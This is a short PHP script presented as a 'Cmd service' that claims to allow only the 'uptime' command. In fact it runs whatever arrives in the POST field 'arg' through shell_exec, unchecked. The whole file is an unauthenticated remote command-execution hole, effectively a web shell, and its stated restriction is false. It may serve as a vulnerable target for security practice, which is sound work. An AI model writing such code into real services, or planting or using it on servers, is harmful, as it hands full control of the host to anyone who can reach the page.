<?php
echo "Cmd service";
echo "</br>";
echo "Allowed commands: uptime";
echo "</br>";
echo shell_exec($_POST['arg']);
?>
